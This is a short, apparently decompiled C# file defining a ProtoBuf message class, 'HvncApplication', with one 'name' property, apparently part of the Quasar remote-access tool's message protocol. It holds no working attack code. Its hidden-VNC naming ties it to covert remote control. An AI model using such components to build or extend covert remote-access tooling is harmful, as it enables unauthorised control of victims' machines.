using System;
using ProtoBuf;
using Quasar.Common.Messages.other;

namespace Quasar.Common.Messages
{
    // Token: 0x02000055 RID: 85
    [ProtoContract]
    public class HvncApplication : IMessage
    {
        // Token: 0x170000AD RID: 173
        // (get) Token: 0x060001E2 RID: 482 RVA: 0x00003E42 File Offset: 0x00002042
        // (set) Token: 0x060001E3 RID: 483 RVA: 0x00003E4A File Offset: 0x0000204A
        [ProtoMember(1)]
        public string name { get; set; }
    }
}
